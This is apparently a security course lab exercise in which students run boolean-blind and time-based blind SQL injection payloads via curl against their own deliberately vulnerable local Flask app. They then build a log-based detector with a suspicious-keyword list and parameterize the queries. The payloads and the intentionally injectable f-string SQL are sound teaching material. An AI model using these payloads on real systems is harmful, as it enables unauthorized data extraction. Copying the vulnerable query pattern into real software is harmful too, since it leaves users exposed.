# Challenge 2 — Blind Injection Detection & Defense

**Goal:** Exploit VULN #5 (boolean-blind SQLi) and VULN #6 (time-based blind SQLi) — where the app never shows you an error, a data value, or anything except a plain yes/no response — and then build a **detector** that would catch this attack pattern from query logs alone, before fixing the underlying bug.

**Estimated time:** ~90 minutes.

## Why "blind," and why this is still authorized, defensive work

Every technique in this challenge runs against `/profile` and `/status` on **your own** `127.0.0.1:5000` instance. "Blind" doesn't mean "against a system you can't see" — it means the *response* gives you no direct feedback (no error text, no reflected data), so you have to infer true/false one bit at a time from something indirect: whether a row matched, or how long the response took. This is exactly the technique a real attacker uses against a hardened app that fails safely (no verbose errors) but is still, underneath, vulnerable — which is precisely why detecting it matters even when a target "looks" safe on the surface.

## Part A — Boolean-blind SQL injection against `/profile`

`GET /profile?id=` returns only `"User found."` or `"Not found."` — no data, no error detail. The query:

```python
query = f"SELECT username FROM users WHERE id = {user_id}"
```

**Task 1.** Confirm the oracle works with two baseline requests:

```bash
curl -s "http://127.0.0.1:5000/profile?id=1"              # expect: User found.
curl -s "http://127.0.0.1:5000/profile?id=1 AND 1=2"      # expect: Not found.
```

The second request proves you can inject a condition that flips the answer — `1=2` is always false, so appending `AND 1=2` to a true baseline makes the WHOLE condition false, and the oracle flips. That flip is your one bit of signal per request.

**Task 2.** Use that one bit to answer a real question the app never displays: **is there a user with `is_admin = 1`?** Try:

```bash
curl -s "http://127.0.0.1:5000/profile?id=1 AND (SELECT is_admin FROM users WHERE id=1)=1"
```

If that returns `User found.`, user 1 is an admin; if `Not found.`, they're not. Repeat for `id=2`, `id=3`. Record, in `blind-boolean-log.md`, the exact query string you sent and the answer, for at least 3 different `id` values — you're reconstructing which accounts are admins, one true/false question at a time, without the app ever showing you the `is_admin` column directly.

## Part B — Time-based blind SQL injection against `/status`

`GET /status?token=` returns only `"Active."` or `"Not active."` — but `crunch_notes.db` has the lab-only `sleep(n)` SQL function registered (see `app.py`'s `get_db()`), which lets a time-based payload work even though SQLite has no built-in delay function. The query:

```python
query = f"SELECT user_id FROM sessions WHERE token = '{token}'"
```

**Task 3.** Confirm you can trigger a measurable delay:

```bash
time curl -s "http://127.0.0.1:5000/status?token=x' OR sleep(3)-- "
```

The response should take roughly 3 seconds longer than a normal request. **This is the entire signal a time-based technique has to work with** — no true/false text, just "did the response take unusually long." Confirm a baseline request (`token=tok_grace_9f2c`) returns near-instantly for comparison.

**Task 4.** Using only response timing (no data, no error text), determine — by injecting a conditional `sleep()` — whether the session token `tok_grace_9f2c` belongs to a user with `is_admin = 1`, without ever looking at the `sessions` or `users` tables directly:

```bash
time curl -s "http://127.0.0.1:5000/status?token=x' OR (SELECT sleep(3) FROM users WHERE username='admin' AND is_admin=1)-- "
```

If it delays ~3s, the condition was true. Record your query and timing result in `blind-time-log.md`.

## Part C — Build a detector (the defensive half — do not skip)

You just generated the exact traffic pattern a real time-based/boolean-blind attack produces: **many similar requests, differing by a small injected fragment, with either unusual response times or a suspicious pattern of alternating outcomes.** Detection doesn't require fixing the bug first — it requires noticing the *pattern of requests*, which is visible in logs regardless of whether the underlying query is vulnerable.

**Task 5.** Add lightweight request logging to Crunch Notes — a `query_log` table and a `before_request` hook:

```python
import time as time_module
from flask import g

@app.before_request
def start_timer():
    g.start_time = time_module.time()

@app.after_request
def log_request(response):
    duration_ms = (time_module.time() - g.start_time) * 1000
    db = get_db()
    db.execute(
        "INSERT INTO query_log (route, query_string, duration_ms, logged_at) VALUES (?, ?, ?, CURRENT_TIMESTAMP)",
        (request.path, request.query_string.decode(), duration_ms),
    )
    db.commit()
    return response
```

Add `query_log (id INTEGER PRIMARY KEY, route TEXT, query_string TEXT, duration_ms REAL, logged_at TEXT)` to `init_db()`'s schema.

**Task 6.** Write `detect_blind_injection.py` that flags two independent signals from `query_log`:

```python
import sqlite3

conn = sqlite3.connect("crunch_notes.db")

# Signal 1: latency anomaly -- requests that took far longer than that
# route's typical response time (a crude z-score/threshold check is enough).
print("-- Latency anomalies --")
for row in conn.execute("""
    SELECT route, query_string, duration_ms
    FROM query_log
    WHERE duration_ms > (SELECT AVG(duration_ms) + 3 * (
        SELECT AVG(ABS(duration_ms - (SELECT AVG(duration_ms) FROM query_log))) FROM query_log
    ) FROM query_log)
    ORDER BY duration_ms DESC
"""):
    print(row)

# Signal 2: suspicious query-string content -- SQL keywords/operators that
# have no business appearing in a URL parameter for these routes.
print("-- Suspicious query strings --")
suspicious_terms = ["OR ", "AND ", "SELECT", "UNION", "sleep(", "--", "'"]
for row in conn.execute("SELECT route, query_string, duration_ms FROM query_log"):
    route, qs, dur = row
    if any(term.lower() in qs.lower() for term in suspicious_terms):
        print(row)
```

Run it after generating traffic from Parts A and B, and confirm both signals correctly flag your own attack requests.

## Expected result

- `blind-boolean-log.md` and `blind-time-log.md` each show you correctly inferred at least one piece of data (which user IDs are admins) using only the oracle's yes/no or fast/slow signal.
- `detect_blind_injection.py`'s latency-anomaly query flags your `sleep()`-based requests.
- The suspicious-query-string check flags your boolean-based requests (they contain ` OR `, `SELECT`, or `--`).

## Why the real fix is still Lecture 2's fix

Detection buys you *time to notice and respond* — it does not close the hole. The structural fix for VULN #5 and #6 is identical to VULN #1 and #2: parameterize both queries. Do that now, in `app.py`, and re-run Parts A and B's payloads one more time to confirm the oracle no longer leaks anything (both should now behave identically for a legitimate and a malicious `id`/`token`, because the database is comparing values, not parsing your payload as SQL). Record both fixes and verifications in `findings.db` exactly as in Exercises 1–3.

## Submission

Commit `blind-boolean-log.md`, `blind-time-log.md`, `detect_blind_injection.py`, the updated `app.py` (with `query_log`, the logging hooks, and VULN #5/#6 parameterized), and the updated `findings.db` to `c50-week-05/challenge-02/`.
